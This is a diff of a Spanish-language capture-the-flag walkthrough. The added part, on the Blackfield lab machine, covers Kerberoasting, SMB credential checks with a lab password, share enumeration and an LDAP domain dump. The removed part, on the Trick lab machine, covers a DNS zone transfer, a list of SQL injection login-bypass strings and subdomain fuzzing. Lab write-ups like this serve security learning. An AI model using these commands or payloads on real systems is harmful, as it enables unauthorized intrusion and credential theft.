@@ -90,71 +90,54 @@ Ahora vamos a hacer un ataque ASREPROAST para intentar conseguir un TGT, cuando 
 
 ![asreproast](images/07_asreproast.png)
 
-## Dominio
-
-Recordamos que tenemos abierto el puerto 53, con ello vamos a intentar hacer un ataque de transferencia de zona que consistirá en la busqueda de algun dominio expuesto
+Ahora que tenemos un usuario y credencial podemos probar un Kerberoasting attack
 
 ```bash
-dig @<IP> -x <IP>
+$ impacket-GetUserSPNs 'blackfield.local/support:#00^BlackKnight'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+No entries found!
 ```
+Pero en este caso no nos da un TGS
 
-Vemos que el registro PTR nos ha devuelto un dominio llamado trick.htb
-
-![comando dig](images/04_dig.png)
-
-Vamos a añadirlo al /etc/hosts de nuestra máquina
-
-![/etc/hosts](images/05_etc_hosts.png)
-
-
-Ahora hacemos una transferencia de zona para ver si hay algun subdominio
+Con netexec vamos a comprobar si el usuario y las credenciales del smb son válidas
 
 ```bash
-dig @<IP> axfr <DOMAIN>
+❯ netexec smb 10.129.229.17 -u 'support' -p '#00^BlackKnight'
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
 ```
-Conseguimos un subdominio llamado preprod-payroll.trick.htb que también vamos a añadir al /etc/hosts
+En este caso pone un + y eso significa que si son válidas. Si pusiera pwned con impacket-psexec podríamos crearnos una consola de comandos.
 
-![Transferencia de zona](images/06_axfr.png)
+# 🌐 Enumeración smb 2
 
-# 🌐 Enumeración Web 2
-
-Con el dominio conseguido, probamos en el navegador a ver si conseguimos que cambie la web
-
-![web2](images/07_web2.png)
-
-En este panel vamos a probar credenciales típicas como admin:admin admin:password user:user etc... Pero no conseguiremos el acceso.
-
-Vamos a probar una inyeccion sql típica
-
-```sql
-or1=1
-'or'1'='1
-'or'1'='1--
-'or'1'='1-- -
-admin'or1=1
-admin'or1=1-- -
-admin'or1=1--
-admin'or'1'='1
-```
-Probando tipicas conseguimos acceso con el 'or'1'='1
-
-![admin_panel](images/08_admin_panel.png)
-
-Una vez dentro podemos ver que existe el usuario Enemigoss, un empleado que se llama john y poco mas.
-
----
-# Enumeración de subdominios
-
-Como no encontramos nada, vamos a enumerar subdominios de la parte de preproduccion
-Para ello vamos a necesitar la herramienta ffuf y el directorio de diccionarios llamado [seclists](https://github.com/danielmiessler/seclists)
+Ahora que tenemos un usuario vamos a ver si tiene algo en el directorio profiles
 
 ```bash
-ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: preprod-FUZZ.trick.htb' -u http://trick.htb -c --fs 5480
+❯ smbmap -H 10.129.229.17 -u 'support%#00^BlackKnight' -r 'profiles$/support'
+[+] Guest session   	IP: 10.129.229.17:445	Name: blackfield.local                                  
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	profiles$                                         	READ ONLY	
+	.\profiles$support\*
+	dr--r--r--                0 Wed Jun  3 18:47:12 2020	.
+	dr--r--r--                0 Wed Jun  3 18:47:12 2020	..
 ```
-Vemos que se nos muestran dos subdominios, uno que es el que ya descubrimos y otro llamado marketing que es nuevo.
-Lo añadiremos al etc/host
+Pero vemos que no es el caso.
 
-![ffuf](images/09_ffuf.png)
+Vamos a usar una herramienta llamada ldapdomaindump que sirve para dumpear información del dominio cuando tenemos un usuario y credenciales válidas
+
+```bash
+ldapdomaindump -u '<DOMINIO>\<USUARIO>' -p '<CONSTRASEÑA>' <IP>
+```
+
+Con esto se nos generarán varios archivos html.
+Ahora nos montamos un servidor web para poder verlos correctamente
+
+```bash
+python3 -m http.server 80
+```
+Y vamos a http://127.0.0.1/domain_users_by_group.html#cn_Administrators
 
 # 🌐 Enumeración web 3
 
